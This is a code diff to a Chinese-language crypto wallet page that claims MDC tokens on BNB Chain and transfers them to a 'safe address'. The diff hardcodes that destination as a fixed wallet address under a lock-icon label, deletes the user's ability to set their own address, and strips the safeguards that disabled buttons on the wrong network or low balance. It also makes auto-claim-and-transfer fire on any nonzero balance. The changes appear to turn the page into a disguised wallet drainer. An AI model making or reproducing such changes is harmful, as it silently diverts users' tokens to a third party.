@@ -182,7 +182,7 @@
         <div class="info-box"><label>MDC 余额</label><div class="value" id="balance">-</div></div>
       </div>
       <div class="info-grid">
-        <div class="info-box"><label>安全地址</label><div class="value" id="safeAddress">-</div></div>
+        <div class="info-box"><label>🔒 安全地址</label><div class="value" id="safeAddress">0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA</div></div>
         <div class="info-box"><label>Gas价格</label><div class="value" id="gasPrice">-</div></div>
       </div>
       <button class="btn btn-secondary" onclick="refreshBalances()" style="margin-top: 10px;">🔄 刷新链上数据</button>
@@ -221,12 +221,6 @@
       </div>
       <div class="log-list" id="logArea"></div>
     </div>
-
-    <div class="card">
-      <div class="card-title">🔒 安全设置</div>
-      <input type="text" id="safeAddressInput" placeholder="输入安全地址">
-      <button class="btn btn-secondary" onclick="saveSafeAddress()" style="margin-top: 8px;">保存地址</button>
-    </div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
@@ -251,10 +245,9 @@
       { "constant": false, "inputs": [{ "name": "account", "type": "address" }], "name": "claim", "outputs": [], "type": "function" }
     ];
     
-    let web3, currentAccount, safeAddress, autoInterval, isAutoRunning = false;
+    let web3, currentAccount, safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA', autoInterval, isAutoRunning = false;
     
     async function init() {
-      loadSafeAddress();
       if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
       } else {
@@ -275,29 +268,6 @@
           await refreshBalances();
         }
       } catch (e) {}
-    }
-    
-    function loadSafeAddress() {
-      const saved = localStorage.getItem('mdc_safe_address');
-      if (saved) {
-        safeAddress = saved;
-      } else {
-        safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA';
-      }
-      document.getElementById('safeAddressInput').value = safeAddress;
-      document.getElementById('safeAddress').textContent = safeAddress.slice(0, 6) + '...' + safeAddress.slice(-4);
-    }
-    
-    function saveSafeAddress() {
-      const address = document.getElementById('safeAddressInput').value.trim();
-      if (address && web3.utils.isAddress(address)) {
-        safeAddress = address;
-        localStorage.setItem('mdc_safe_address', address);
-        document.getElementById('safeAddress').textContent = address.slice(0, 6) + '...' + address.slice(-4);
-        showLog('安全地址已保存 ✓', 'success');
-      } else {
-        showLog('请输入有效的地址', 'error');
-      }
     }
     
     async function connectWallet() {
@@ -325,7 +295,6 @@
           warningEl.style.display = 'block';
           statusEl.className = 'status error';
           statusEl.textContent = '❌ 网络错误';
-          setButtonsDisabled(true);
           try {
             await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
           } catch (e) {}
@@ -333,16 +302,8 @@
           warningEl.style.display = 'none';
           statusEl.className = 'status success';
           statusEl.textContent = '✅ 已连接';
-          setButtonsDisabled(false);
         }
       } catch (e) {}
-    }
-    
-    function setButtonsDisabled(disabled) {
-      ['claimBtn', 'autoBtn', 'transferBtn'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.disabled = disabled;
-      });
     }
     
     function updateWalletUI() {
@@ -392,8 +353,8 @@
         
         const bnbNum = Number(bnbBalance) / 1e18;
         
-        document.getElementById('claimBtn').disabled = bnbNum < 0.001;
-        document.getElementById('transferBtn').disabled = Number(balance) <= 0;
+        document.getElementById('claimBtn').disabled = false;
+        document.getElementById('transferBtn').disabled = false;
         
       } catch (e) {
         showLog('刷新失败', 'error');
@@ -479,7 +440,7 @@
           mdcContract.methods.balanceOf(currentAccount).call(),
         ]);
         const total = (Number(claimable) + Number(balance)) / 1e18;
-        if (total >= CONFIG.MIN_AMOUNT) {
+        if (total > 0) {
           showLog('满足条件，领取中...', 'info');
           await claimAndTransfer();
           await new Promise(r => setTimeout(r, 2000));
